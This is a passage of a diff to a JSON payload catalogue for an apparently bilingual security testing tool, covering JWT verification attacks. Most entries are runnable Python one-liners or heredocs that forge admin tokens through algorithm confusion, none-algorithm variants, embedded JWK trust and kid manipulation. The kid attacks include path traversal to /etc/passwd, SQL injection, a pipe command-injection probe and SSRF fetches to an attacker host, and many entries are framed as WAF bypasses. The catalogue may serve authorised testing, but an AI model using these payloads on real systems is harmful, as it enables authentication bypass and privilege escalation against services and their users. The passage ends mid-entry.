+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\nh = base64.urlsafe_b64encode(b'{\"alg\":\"hs256\",\"typ\":\"JWT\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"SECRET\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "小写算法名命中宽松的算法白名单匹配。成功判据：验证通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Lowercase algorithm names hit lenient allowlist matching. Success: verification passes. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "python3 - <<'PY' \n import base64, json, subprocess \n b = lambda x: base64.urlsafe_b64encode(x).decode().rstrip('=') \n h = b(json.dumps({\"alg\":\"PS256\",\"typ\":\"JWT\"}, separators=(',',':')).encode()) \n p = b(json.dumps({\"sub\":\"admin\"}, separators=(',',':')).encode()) \n sig = subprocess.run([\"openssl\",\"dgst\",\"-sha256\",\"-sign\",\"key.pem\"],input=f\"{h}.{p}\".encode(),capture_output=True,check=True).stdout \n print(f\"{h}.{p}.{b(sig)}\") \n PY",
+          "description": {
+            "zh": "同族算法签名格式互换探测验签未绑定具体 alg。成功判据：跨族签名被接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Same-family signature format swaps probe verifiers that do not pin the exact alg. Success: a cross-family signature is accepted. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "python3 - <<'PY' \n import base64, hmac, hashlib, json \n pub = open(\".payloader-jwt-fixture/public.pem\").read() \n h = base64.urlsafe_b64encode(json.dumps({\"alg\":\"HS256\",\"typ\":\"JWT\"}, separators=(',',':')).encode()).decode().rstrip('=') \n p = base64.urlsafe_b64encode(json.dumps({\"sub\":\"admin\"}, separators=(',',':')).encode()).decode().rstrip('=') \n s = base64.urlsafe_b64encode(hmac.new(pub.encode(), f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=') \n print(f\"{h}.{p}.{s}\") \n PY",
+          "description": {
+            "zh": "绕过算法-密钥类型绑定缺失：把 RS256 公钥当 HS256 对称密钥签名。成功判据：令牌通过验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Bypasses missing algorithm-key type binding by signing with the RS256 public key treated as an HS256 secret. Success: the token validates. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib, json\nsecret = b\"PAYLOADER_TEST_SECRET\"\nh = base64.urlsafe_b64encode(b'{\"alg\":\"hs256\",\"typ\":\"JWT\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(secret, f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "宽松解析接受小写算法名并回落到对称验证。成功判据：验证通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Lenient parsers accept lowercase algorithm names and fall back to symmetric verification. Success: verification passes. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "python3 - <<'PY' \n import base64, json, subprocess \n b = lambda x: base64.urlsafe_b64encode(x).decode().rstrip('=') \n rh = b(json.dumps({\"alg\":\"RS256\",\"typ\":\"JWT\"}, separators=(',',':')).encode()) \n ph = b(json.dumps({\"alg\":\"PS256\",\"typ\":\"JWT\"}, separators=(',',':')).encode()) \n p = b(json.dumps({\"sub\":\"admin\"}, separators=(',',':')).encode()) \n sig = subprocess.run([\"openssl\",\"dgst\",\"-sha256\",\"-sign\",\"key.pem\"],input=f\"{rh}.{p}\".encode(),capture_output=True,check=True).stdout \n print(f\"{ph}.{p}.{b(sig)}\") \n PY",
+          "description": {
+            "zh": "PS256 与 RS256 签名格式兼容，重放跨算法签名探测校验缺失。成功判据：验签未报算法不匹配。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "PS256 and RS256 signature formats overlap; replaying across algorithms probes for missing checks. Success: verification does not flag an algorithm mismatch. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "curl -sS --max-time 5 -H \"Authorization: Bearer PAYLOADER_ALG_CONFUSION_TEST\" http://127.0.0.1:8080/api/marker\n# Use the owned issuer JWKS key, not the TLS certificate key; a modern verifier should reject algorithm confusion.",
+          "description": {
+            "zh": "在隔离环境使用合成主体执行该JWT 算法与密钥类型绑定样例，并以服务端日志和只读标记确认结果。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Run this JWT Algorithm and Key-Type Binding sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 7,
+          "expectedCommand": "python3 -c \"import base64,json,hmac,hashlib;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h=e({'alg':'HS512','typ':'JWT'});p=e({'user_id':1,'role':'admin'});k=open('.payloader-jwt-fixture/public.pem','rb').read();s=base64.urlsafe_b64encode(hmac.new(k,(h+'.'+p).encode(),hashlib.sha512).digest()).rstrip(b'=').decode();print(h+'.'+p+'.'+s)\"",
+          "description": {
+            "zh": "头部变形：HS512 混淆变体 — 算法改 HS512 并以公钥为 HMAC 密钥重签，规避仅拦截 HS256 头部的规则；成功判据：验证器以公钥为对称密钥完成 HS512 验签，令牌被接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Switches to HS512 signed with the public key to evade rules blocking only HS256 headers. Success: the server treats the token as a valid RS-family token. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 8,
+          "expectedCommand": "python3 -c \"import base64,json,hmac,hashlib;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();pub=open('.payloader-jwt-fixture/public.pem').read();h=e({'alg':'HS256','typ':'JWT','jwk':{'kty':'oct','k':base64.urlsafe_b64encode(pub.encode()).rstrip(b'=').decode()}});p=e({'sub':'1','role':'admin'});s=base64.urlsafe_b64encode(hmac.new(pub.encode(),(h+'.'+p).encode(),hashlib.sha256).digest()).rstrip(b'=').decode();print(h+'.'+p+'.'+s)\"",
+          "description": {
+            "zh": "公钥作为 oct JWK 内嵌头部并同时充当 HMAC 密钥，规避外部密钥依赖型检测；成功判据：验证器用内嵌密钥通过校验。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Embeds the public key as an oct JWK while using it as the HMAC secret, evading external-key-dependency detection. Success: the verifier passes using the embedded key. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 9,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();print(e({'alg':['RS256','HS256'],'typ':'JWT'})+'.'+e({'sub':'1'})+'.')\"",
+          "description": {
+            "zh": "alg 写成数组，部分库取最后一个元素，绕过期望单值的头部校验；成功判据：按 HS256 语义处理令牌。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "alg as an array makes some libs take the last element, evading single-value header validation. Success: the token is processed with HS256 semantics. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "python3 - <<'PY' \n import base64, json, hmac, hashlib \n b = lambda x: base64.urlsafe_b64encode(x).decode().rstrip('=') \n k = open('.payloader-jwt-fixture/public.pem','rb').read() \n def t(hdr): \n     h = b(json.dumps(hdr, separators=(',',':')).encode()) \n     p = b(json.dumps({\"user_id\":1,\"role\":\"admin\"}, separators=(',',':')).encode()) \n     s = base64.urlsafe_b64encode(hmac.new(k, f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=') \n     return f\"{h}.{p}.{s}\" \n print(t({\"alg\":\"HS256\",\"typ\":\"JWT\"})) \n print(t({\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"\"})) \n print(t({\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":None})) \n print(t({\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../etc/passwd\"})) \n PY",
+          "description": {
+            "zh": "提交 RSA/HMAC 混淆与空 kid 变体令牌；验证器以公钥作 HMAC 密钥接受令牌，即确认算法混淆。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Submit the RSA/HMAC confusion and empty-kid token variants; a verifier accepting the token with the public key as HMAC secret confirms algorithm confusion. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "jwt-claim-profile-validation",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "{\"alg\":\"RS256\",\"alg\":\"none\",\"typ\":\"JWT\"}",
+          "description": {
+            "zh": "绕过头部单键解析的 WAF 规则：重复 alg 键在验证层与日志层取值不同。成功判据：none 实例被验证接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Bypasses single-key header parsing: duplicate alg keys resolve differently in validation vs logging. Success: the none instance is accepted by validation. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "jwt-embedded-jwk-trust-validation",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"kid\":\"trusted-key-id\",\"jwk\":{\"kty\":\"RSA\",\"kid\":\"attacker-key\",\"n\":\"ATTACKER_MODULUS\",\"e\":\"AQAB\"}}",
+          "description": {
+            "zh": "头部 kid 指向可信键而内嵌 jwk 为攻击者键，检验取键优先级。成功判据：按内嵌 jwk 验证通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Header kid points at a trusted key while the embedded jwk is the attacker's, probing key-selection priority. Success: verification succeeds against the embedded jwk. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_MODULUS\",\"e\":\"AQAB\"}}",
+          "description": {
+            "zh": "HS256 配 RSA 形态 jwk，绕过算法-密钥类型绑定检查。成功判据：非对称材料被用于对称验签。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "HS256 paired with an RSA-shaped jwk bypasses algorithm-key type binding. Success: asymmetric material is used for symmetric verification. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"kid\":\"\\u0074rusted-key-id\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"ATTACKER_MODULUS\",\"e\":\"AQAB\"}}",
+          "description": {
+            "zh": "Unicode 转义 kid 绕过头值特征匹配。成功判据：变形 kid 完成键匹配。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Unicode-escaped kid bypasses header-value signature matching. Success: the mutated kid completes key matching. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":{\"kty\":\"RSA\",\"kid\":\"PAYLOADER_UNTRUSTED\",\"n\":\"PAYLOADER_TEST_MODULUS\",\"e\":\"AQAB\"}}\n{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jku\":\"https://jwks.example.invalid/payloader-test.json\",\"kid\":\"PAYLOADER_UNTRUSTED\"}\npython3 jwt_tool.py fixtures/payloader-rs256.jwt -X s -pr fixtures/payloader-test-private.pem\n# example.invalid is non-resolving; the verifier must use issuer-pinned HTTPS JWKS and reject token-supplied untrusted keys.",
+          "description": {
+            "zh": "在隔离环境使用合成主体执行该JWT JWK 与 JKU 信任边界样例，并以服务端日志和只读标记确认结果。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Run this JWT JWK and JKU Trust Boundary sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        }
+      ]
+    },
+    {
+      "id": "jwt-kid-lookup-validation",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"..%2Fkeys%2Fattacker\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"ATTACKER_KEY\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "编码遍历 kid 在键文件加载层还原为路径。成功判据：攻击者键文件完成验签。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Encoded traversal resolves at the key-file loading layer. Success: the attacker key file satisfies verification. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"k\\' UNION SELECT 0x414141 --\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"AAAA\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "kid 注入 SQL 使键查询返回攻击者选定值。成功判据：注入键完成签名验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "SQL in kid makes the key lookup return an attacker-chosen value. Success: the injected key satisfies the signature check. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"//{ATTACKER_HOST}/keys/1\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"ATTACKER_KEY\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "协议相对 kid 值被拼进取键地址（SSRF）。成功判据：{ATTACKER_HOST} 收到取键请求。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "A protocol-relative kid is concatenated into the key-fetch URL (SSRF). Success: {ATTACKER_HOST} receives the key fetch. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib, json\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"..%2F..%2Ffixtures%2Fattacker-key\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"ATTACKER_KEY\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "绕过 kid 文件名白名单匹配：编码遍历段在文件加载层还原。成功判据：以攻击者密钥文件完成验签。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Bypasses kid filename allowlists since encoded traversal segments resolve at the file-loading layer. Success: verification uses the attacker key file. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 4,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"x\\' UNION SELECT \\\"ATTACKER_SECRET\\\"--\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"ATTACKER_SECRET\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "kid 进入 SQL 查询取密钥时注入常量密钥。成功判据：注入密钥完成签名验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Injects a constant secret when kid flows into the key-lookup SQL. Success: the injected secret satisfies signature verification. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 5,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, hmac, hashlib\nh = base64.urlsafe_b64encode(b'{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"http://{ATTACKER_HOST}/jwks.json\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\ns = base64.urlsafe_b64encode(hmac.new(b\"ATTACKER_SECRET\", f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=')\nprint(f\"{h}.{p}.{s}\")\nPY",
+          "description": {
+            "zh": "探测 kid 被当作远程密钥地址加载（SSRF+密钥控制）。成功判据：攻击者主机收到取钥请求且令牌通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Probes whether kid is fetched as a remote key URL (SSRF plus key control). Success: attacker host receives the key fetch and the token validates. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 6,
+          "expectedCommand": "{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"PAYLOADER_UNKNOWN_KEY\"}\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../fixtures/payloader-test-key\"}\n{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"PAYLOADER_MARKER OR 1=2\"}\n# The localhost resolver must treat kid as an allowlisted identifier, never SQL or a filesystem path.",
+          "description": {
+            "zh": "在隔离环境使用合成主体执行该JWT kid 解析与允许列表样例，并以服务端日志和只读标记确认结果。受控样例：用于建立基线/对照，非独立绕过手法。",
+            "en": "Run this JWT Kid Parsing and Allowlisting sample with synthetic principals in an isolated environment and confirm the result with server logs and a read-only marker. Controlled sample: establishes a baseline or control and is not a standalone bypass technique."
+          },
+          "kind": "control"
+        },
+        {
+          "area": "wafBypass",
+          "index": 7,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h={'alg':'HS256','typ':'JWT','kid':chr(39)+' UNION SELECT '+chr(39)+'attacker_known_secret'+chr(39)+' -- '};print(e(h)+'.'+e({'sub':'1','role':'admin'}))\" # 签名密钥用 attacker_known_secret 重签",
+          "description": {
+            "zh": "绕过对路径穿越型 kid 的拦截：kid 走 SQL 注入把密钥选择固定到已知值；成功判据：用已知密钥签名的令牌通过验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Bypasses traversal-style kid blocking by steering key selection to a known value via SQLi. Success: a token signed with the known secret validates. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 8,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h={'alg':'HS256','typ':'JWT','kid':'|id'};print(e(h)+'.'+e({'sub':'1'}))\"",
+          "description": {
+            "zh": "kid 传入 | 命令注入探针（shell_exec 型密钥加载场景），规避 ../../ 路径特征；成功判据：响应或日志出现命令执行痕迹。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Probes command injection via kid (shell_exec key loading), avoiding ../../ path signatures. Success: command execution traces appear in the response or logs. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 9,
+          "expectedCommand": "python3 -c \"import base64,json;e=lambda d:base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode();h={'alg':'HS256','typ':'JWT','kid':'http://{ATTACKER_HOST}/keys/1'};print(e(h)+'.'+e({'sub':'1'}))\"",
+          "description": {
+            "zh": "kid 写远程 URL 诱导密钥拉取（JWKS 型实现），规避本地路径检测；成功判据：{ATTACKER_HOST} 收到密钥请求。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Points kid at a remote URL to lure key fetching in JWKS-style implementations, evading local-path detection. Success: {ATTACKER_HOST} receives a key request. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 10,
+          "expectedCommand": "python3 - <<'PY' \n import base64, json, hmac, hashlib, sys \n b = lambda x: base64.urlsafe_b64encode(x).decode().rstrip('=') \n kid_path = sys.argv[1]     # kid 注入路径，如 ../../../etc/passwd \n key = open(sys.argv[2], 'rb').read()\n h = b(json.dumps({\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":kid_path}, separators=(',',':')).encode()) \n p = b(json.dumps({\"sub\":\"1\"}, separators=(',',':')).encode()) \n s = base64.urlsafe_b64encode(hmac.new(key, f\"{h}.{p}\".encode(), hashlib.sha256).digest()).decode().rstrip('=') \n print(f\"{h}.{p}.{s}\") \n PY",
+          "description": {
+            "zh": "把 kid 路径与注入变体逐条置于头部提交；服务端按注入的 kid 查找并接受令牌，即确认密钥选择可操纵。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Submit each kid path or injection variant in the header; the server resolving the injected kid and accepting the token confirms manipulable key selection. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        }
+      ]
+    },
+    {
+      "id": "jwt-none-algorithm-rejection",
+      "patches": [
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, json\nh = base64.urlsafe_b64encode(b'{\"alg\":\"NONE\",\"typ\":\"JWT\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+          "description": {
+            "zh": "绕过小写 \"none\" 精确黑名单：大写形态被宽松解析接受。成功判据：令牌通过验证。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Bypasses lowercase exact blacklists since uppercase forms pass lenient parsing. Success: the token validates. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, json\nh = base64.urlsafe_b64encode(b'{\"typ\":\"JWT\"}').decode().rstrip('=')\np = base64.urlsafe_b64encode(b'{\"sub\":\"admin\"}').decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+          "description": {
+            "zh": "省略 alg 触发默认算法回落。成功判据：无算法头令牌被接受。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "Omitting alg triggers default-algorithm fallback. Success: the headerless-alg token is accepted. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "python3 -c \"import base64;h=base64.urlsafe_b64encode(b'{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}').decode().rstrip('=');p=base64.urlsafe_b64encode(b'{\\\"sub\\\":\\\"admin\\\"}').decode().rstrip('=');print(f'{h}.{p}.AQ')\"",
+          "description": {
+            "zh": "非空残缺签名测试验签器对 none 的弱判断。成功判据：残缺段仍判为未签名通过。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
+            "en": "A non-empty truncated signature probes weak none detection in verifiers. Success: the stub segment is still treated as unsigned and passes. Modern-library reality: PyJWT 2+ and jsonwebtoken 8+ reject this form by default, so it only succeeds against hand-rolled verifiers or outdated libraries."
+          },
+          "effectiveness": "B"
+        },
+        {
+          "area": "wafBypass",
+          "index": 3,
+          "expectedCommand": "python3 - <<'PY'\nimport base64, json\nh = base64.urlsafe_b64encode(json.dumps({\"alg\":\"nOnE\",\"typ\":\"JWT\"}, separators=(',',':')).encode()).decode().rstrip('=')\np = base64.urlsafe_b64encode(json.dumps({\"sub\":\"admin\"}, separators=(',',':')).encode()).decode().rstrip('=')\nprint(f\"{h}.{p}.\")\nPY",
+          "description": {
+            "zh": "绕过字符串全等 \"none\" 白名单：混合大小写仍被宽松解析接受。成功判据：令牌通过验证返回受保护数据。现代库现状：PyJWT 2+ / jsonwebtoken 8+ 默认拒绝该形态，仅自研校验或旧库成立。",
